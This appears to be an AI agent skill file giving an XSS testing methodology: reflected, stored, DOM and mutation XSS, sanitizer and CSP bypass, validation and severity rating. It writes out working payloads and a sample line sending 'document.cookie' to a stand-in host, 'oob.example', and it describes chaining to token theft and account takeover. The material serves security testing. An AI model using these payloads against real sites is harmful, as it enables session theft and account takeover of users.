---
name: xss-testing
description: Test applications for Cross-Site Scripting — reflected, stored, and DOM-based XSS, plus mutation XSS (mXSS), CSP evaluation and bypass, and XSS-to-account-takeover chaining. OWASP A05:2025 Injection. Use for any input that is later rendered in an HTML/JS context (search, comments, profile fields, URL params, error messages).
---

# XSS Testing

XSS executes attacker-controlled JavaScript in a victim's browser in the app's origin — enabling session/token theft, action-on-behalf, and account takeover. Three primary classes plus mutation XSS. Methodology: **inject a unique marker → find every reflection/sink → craft a context-appropriate payload → confirm execution → chain to impact.**

## Classes and where they live

- **Reflected**: input echoed straight back in the response (search terms, error messages, URL params). Fires per-request; needs the victim to open a crafted link.
- **Stored**: input persisted server-side and rendered to every viewer (comments, profile names, support tickets, filenames, admin log views). Highest impact — can hit admins.
- **DOM-based**: client-side JS reads an attacker-controlled source (`location.hash`, `location.search`, `document.referrer`, `postMessage`, `localStorage`) and writes it to a dangerous sink (`innerHTML`, `document.write`, `eval`, `setAttribute`, jQuery `.html()`, framework `dangerouslySetInnerHTML`/`v-html`) — never touching the server.
- **Mutation XSS (mXSS)**: payload is benign until the browser's HTML parser re-serializes/normalizes it into executable markup, defeating some sanitizers.

## Methodology

1. **Map reflections**: submit a unique non-HTML marker (e.g. `zqxjk1`) into every input; find every place it appears in responses (body, attributes, JS, JSON, headers). For DOM XSS, search the live DOM in devtools for the marker.
2. **Identify the context** at each reflection: HTML body, HTML attribute (quoted/unquoted), inside `<script>`, inside a URL/`href`, inside a CSS block, or inside a JS string. The context dictates the escape sequence you need.
3. **Craft a context-breaking payload**:
   - HTML body: `<img src=x onerror=alert(document.domain)>` / `<svg onload=...>`.
   - Attribute: break out with `"` or `'` then add an event handler, e.g. `" autofocus onfocus=alert(document.domain) x="`.
   - Inside `<script>`: close the string/tag: `';alert(document.domain)//` or `</script><img ...>`.
   - URL context: `javascript:alert(document.domain)`.
4. **Confirm execution** with a benign proof: `alert(document.domain)` / `document.cookie` length, or better a callback to your listener (`fetch('//oob.example/'+document.cookie)`) — `document.domain` proves the executing origin.
5. **Chain to impact**: session cookie theft (if not `HttpOnly`), bearer/JWT theft from `localStorage`, CSRF-token theft, forced privileged actions, or stored XSS firing in an admin panel → account takeover.

## Filter / sanitizer bypass

- Case variation, tag/attribute mangling, no-space payloads, alternative event handlers (`onpointerenter`, `onanimationstart`), and tags without closing (`<svg onload=...`).
- If `<` `>` are filtered but you're in an attribute, use event handlers without new tags.
- HTML-entity / URL / unicode encoding mismatches between filter and browser.
- mXSS via nesting that the sanitizer normalizes into live markup.
- Polyglot payloads to test many contexts in one shot when you can't see the reflection context.

## CSP evaluation & bypass

- First read the `Content-Security-Policy` header. Weak policies: `unsafe-inline`, `unsafe-eval`, overly broad `*`/CDN allowlists, missing `object-src`/`base-uri`.
- Bypass vectors: JSONP endpoints on an allowlisted host, open redirects on an allowlisted host, `base-uri` injection, nonce leakage/reuse, dangling-markup data capture when script execution is blocked.
- Modern strong CSP uses nonce/hash + `strict-dynamic` and de-emphasizes domain allowlists — note in findings whether the policy actually mitigates the XSS or just raises the bar.

## Validation — avoid false positives

- Confirm the payload **actually executes** in a browser (alert fires / callback lands), not merely that it's reflected unencoded. A reflection without execution is a lower-severity output-encoding note, not confirmed XSS.
- For DOM XSS, trace the exact source→sink path in devtools; don't infer from reflection alone.
- Re-test with the app's real sanitizer in place (some reflect raw in one view but encode in the rendered view).

## Severity guidance

- **Critical/High**: stored XSS reachable by other users/admins, or reflected XSS chainable to account takeover / token theft.
- **Medium**: reflected XSS requiring user interaction with limited impact, or DOM XSS in a non-sensitive context.
- **Low**: self-XSS only (attacker can only run it in their own session with no delivery path).

## References

- OWASP Top 10 2025 — A05 Injection
- OWASP WSTG v4.2 — 4.7.1 Reflected, 4.7.2 Stored, 4.7.3 DOM XSS
- PortSwigger Web Security Academy — Cross-site scripting
